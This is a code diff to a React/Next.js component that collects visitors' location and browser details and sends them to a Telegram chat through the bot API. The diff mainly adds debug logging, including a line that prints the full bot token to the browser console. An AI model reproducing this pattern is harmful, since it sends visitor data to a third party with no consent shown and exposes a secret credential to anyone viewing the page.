@@ -26,10 +26,26 @@ interface UserInfoData {
 }
 
 export default function UserInfo() {
+  useEffect(() => {
+    // Debug logging for environment variables
+    console.log('Bot Token exists:', !!process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN);
+    console.log('Chat ID exists:', !!process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID);
+    console.log('Bot Token value:', process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN);
+    console.log('Chat ID value:', process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID);
+  }, []);
+
   const sendToTelegram = async (info: UserInfoData) => {
     try {
       const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
       const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
+      
+      // Additional debug logging
+      console.log('Attempting to send to Telegram with:', {
+        botTokenExists: !!botToken,
+        chatIdExists: !!chatId,
+        botTokenLength: botToken?.length,
+        chatIdLength: chatId?.length
+      });
       
       if (!botToken || !chatId) {
         console.error('Telegram configuration missing. Check your .env file.');
@@ -57,6 +73,11 @@ ${locationInfo}
 - Cookies Enabled: ${info.browser.cookiesEnabled ? 'Yes' : 'No'}
 - Online Status: ${info.browser.onlineStatus ? 'Online' : 'Offline'}`;
 
+      console.log('Sending message to Telegram:', {
+        messageLength: message.length,
+        apiUrl: `https://api.telegram.org/bot${botToken.substring(0, 5)}...`
+      });
+
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
         text: message,
@@ -64,8 +85,12 @@ ${locationInfo}
       });
 
       console.log('Information sent to Telegram successfully!');
-    } catch (error) {
-      console.error('Error sending to Telegram:', error);
+    } catch (error: any) {
+      console.error('Error sending to Telegram:', {
+        message: error.message,
+        response: error.response?.data,
+        status: error.response?.status
+      });
     }
   };
 
@@ -102,7 +127,10 @@ ${locationInfo}
           browser: browserInfo,
         };
         await sendToTelegram(info);
-        console.error('Location error:', error);
+        console.error('Location error:', {
+          code: error.code,
+          message: error.message
+        });
       }
     );
   };
